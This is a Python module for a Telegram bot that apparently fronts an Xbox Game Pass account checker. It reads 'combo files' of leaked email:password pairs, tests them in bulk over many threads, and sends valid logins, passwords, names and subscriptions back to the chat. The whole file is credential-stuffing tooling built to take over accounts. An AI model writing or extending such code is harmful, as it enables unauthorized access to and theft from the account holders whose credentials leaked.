"""
Xbox Game Pass Bot Integration Handler
Connects Xbox engine to the bot framework with full statistics tracking
"""

import json
import logging
from datetime import datetime
from typing import Dict, List, Optional, Any
from concurrent.futures import ThreadPoolExecutor
import threading
import queue

from bot_handlers import XboxManager, handle_error

logger = logging.getLogger(__name__)


class XboxBotIntegration:
    """Integrates Xbox engine with Telegram bot for command handling"""
    
    def __init__(self):
        self.manager = XboxManager()
        self.active_sessions = {}  # Track active checking sessions
        self.result_lock = threading.Lock()
        self.results_file = "Xbox_Bot_Results.json"
    
    def is_enabled(self) -> bool:
        """Check if Xbox checking is available"""
        return self.manager.is_available()
    
    async def handle_xbox_check(self, update, context) -> str:
        """
        Handle /xbox_check command
        Usage: /xbox_check <combo_file> <threads>
        """
        try:
            if not self.is_enabled():
                return "❌ Xbox engine not available"
            
            args = context.args
            if len(args) < 1:
                return "❌ Usage: /xbox_check <combo_file> [threads]"
            
            combo_file = args[0]
            threads = int(args[1]) if len(args) > 1 else 50
            
            user_id = update.effective_user.id
            session_id = f"{user_id}_{datetime.now().timestamp()}"
            
            # Start session
            if not self.manager.start_session(session_id, combo_file):
                return "❌ Could not start checking session"
            
            # Store session
            self.active_sessions[session_id] = {
                "user_id": user_id,
                "combo_file": combo_file,
                "threads": threads,
                "started_at": datetime.now()
            }
            
            return (
                f"✅ **Xbox Checking Started**\n\n"
                f"📁 Combo File: `{combo_file}`\n"
                f"🧵 Threads: {threads}\n"
                f"📊 Session ID: `{session_id}`\n\n"
                f"Use `/xbox_stats {session_id}` to check progress"
            )
        
        except Exception as e:
            return handle_error(e, "Xbox check command", update.effective_user.id)
    
    async def handle_xbox_stats(self, update, context) -> str:
        """
        Handle /xbox_stats command
        Usage: /xbox_stats [session_id]
        """
        try:
            if not self.is_enabled():
                return "❌ Xbox engine not available"
            
            args = context.args
            
            if len(args) > 0:
                # Get stats for specific session
                session_id = args[0]
                stats = self.manager.get_session_stats(session_id)
                if not stats:
                    return "❌ Session not found or stats unavailable"
            else:
                # Get global stats
                stats = self.manager.get_global_stats()
            
            if not stats:
                return "❌ No statistics available"
            
            report = self.manager.format_stats_report(stats)
            return report
        
        except Exception as e:
            return handle_error(e, "Xbox stats command", update.effective_user.id)
    
    async def handle_xbox_single_check(self, update, context) -> str:
        """
        Handle /xbox_check_single command
        Check a single account directly
        Usage: /xbox_check_single <email>:<password>
        """
        try:
            if not self.is_enabled():
                return "❌ Xbox engine not available"
            
            args = context.args
            if len(args) < 1:
                return "❌ Usage: /xbox_check_single <email>:<password>"
            
            combo = args[0]
            if ':' not in combo:
                return "❌ Invalid format. Use: email:password"
            
            email, password = combo.split(':', 1)
            email = email.strip()
            password = password.strip()
            
            result = self.manager.check_account(email, password)
            
            if not result:
                return "❌ Checking failed"
            
            # Format result
            status_map = {
                "valid": "✅ **VALID ACCOUNT**",
                "2fa": "🔒 **2FA PROTECTED**",
                "not_linked": "🔓 **NOT LINKED**",
            }
            
            status = status_map.get(result.get("status"), "⚠️ **UNKNOWN**")
            
            subs_str = ", ".join(result.get('subscriptions', [])) if result.get('subscriptions') else "None"
            
            report = (
                f"{status}\n\n"
                f"📧 Email: `{result.get('email')}`\n"
                f"🔑 Password: `{result.get('password')}`\n"
                f"👤 Name: {result.get('name', 'N/A')}\n"
                f"🆔 UUID: {result.get('uuid', 'N/A')}\n"
                f"🎭 Capes: {result.get('capes', 'N/A')}\n\n"
                f"🏷 **Type:** {result.get('account_type', 'Unknown')}\n"
                f"🎫 **Subscriptions:** {subs_str}"
            )
            
            return report
        
        except Exception as e:
            return handle_error(e, "Xbox single check", update.effective_user.id)
    
    def process_combo_file(self, combo_file: str, threads: int = 50, callback=None) -> Dict[str, Any]:
        """
        Process an entire combo file with multiple threads
        
        Args:
            combo_file: Path to combo file (email:password format)
            threads: Number of threads to use
            callback: Optional callback function for progress updates
        
        Returns:
            Dictionary with final statistics and results
        """
        try:
            if not self.is_enabled():
                return {"status": "error", "message": "Engine not available"}
            
            # Load combos
            combos = []
            try:
                with open(combo_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if ':' in line and line:
                            combos.append(tuple(line.split(':', 1)))
            except Exception as e:
                return {"status": "error", "message": f"Could not read file: {str(e)}"}
            
            if not combos:
                return {"status": "error", "message": "No valid combos found"}
            
            # Process with threads
            total = len(combos)
            checked = 0
            results = []
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                
                for email, password in combos:
                    future = executor.submit(self.manager.check_account, email, password)
                    futures.append(future)
                
                for future in futures:
                    try:
                        result = future.result(timeout=30)
                        if result:
                            results.append(result)
                            if callback:
                                callback(result)
                    except Exception as e:
                        logger.error(f"Thread error: {e}")
                    finally:
                        checked += 1
            
            # Get final stats
            stats = self.manager.get_global_stats()
            
            return {
                "status": "completed",
                "total_processed": total,
                "results": results,
                "statistics": stats
            }
        
        except Exception as e:
            logger.error(f"Combo processing error: {e}")
            return {
                "status": "error",
                "message": str(e)
            }
    
    def get_results_summary(self) -> str:
        """Get a summary of all current results"""
        try:
            stats = self.manager.get_global_stats()
            if not stats:
                return "❌ No results yet"
            
            return self.manager.format_stats_report(stats)
        except Exception as e:
            return handle_error(e, "Getting results summary")
    
    def save_session_results(self, session_id: str) -> bool:
        """Save session results to file"""
        try:
            with self.result_lock:
                session = self.manager.sessions.get(session_id)
                if not session:
                    return False
                
                session_data = {
                    "session_id": session_id,
                    "combo_file": session.get("combo_file"),
                    "started_at": session.get("started_at"),
                    "ended_at": session.get("ended_at"),
                    "status": session.get("status"),
                    "initial_stats": session.get("initial_stats"),
                    "final_stats": session.get("final_stats")
                }
                
                with open(self.results_file, 'a', encoding='utf-8') as f:
                    f.write(json.dumps(session_data, indent=2) + "\n")
                
                return True
        except Exception as e:
            logger.error(f"Could not save results: {e}")
            return False


# Create global integration instance
xbox_integration = XboxBotIntegration()


# ==================== COMMAND HANDLERS FOR BOT ====================

async def cmd_xbox_check(update, context):
    """Command: /xbox_check"""
    message = await xbox_integration.handle_xbox_check(update, context)
    await update.message.reply_text(message, parse_mode="Markdown")


async def cmd_xbox_stats(update, context):
    """Command: /xbox_stats"""
    message = await xbox_integration.handle_xbox_stats(update, context)
    await update.message.reply_text(message, parse_mode="Markdown")


async def cmd_xbox_single(update, context):
    """Command: /xbox_check_single"""
    message = await xbox_integration.handle_xbox_single_check(update, context)
    await update.message.reply_text(message, parse_mode="Markdown")


async def cmd_xbox_results(update, context):
    """Command: /xbox_results"""
    message = xbox_integration.get_results_summary()
    await update.message.reply_text(message, parse_mode="Markdown")


def get_xbox_handlers():
    """
    Get list of handlers for Xbox commands to add to bot application
    
    Usage in main bot file:
        from xbox_bot_integration import get_xbox_handlers
        app = Application.builder()...
        for handler in get_xbox_handlers():
            app.add_handler(handler)
    """
    from telegram.ext import CommandHandler
    
    return [
        CommandHandler("xbox_check", cmd_xbox_check, filters=filters.COMMAND),
        CommandHandler("xbox_stats", cmd_xbox_stats, filters=filters.COMMAND),
        CommandHandler("xbox_check_single", cmd_xbox_single, filters=filters.COMMAND),
        CommandHandler("xbox_results", cmd_xbox_results, filters=filters.COMMAND),
    ]


if __name__ == "__main__":
    # Test integration
    print("Xbox Game Pass Bot Integration Module")
    print(f"Engine available: {xbox_integration.is_enabled()}")
    if xbox_integration.is_enabled():
        print("✅ Ready for use!")
    else:
        print("❌ Xbox engine not available")
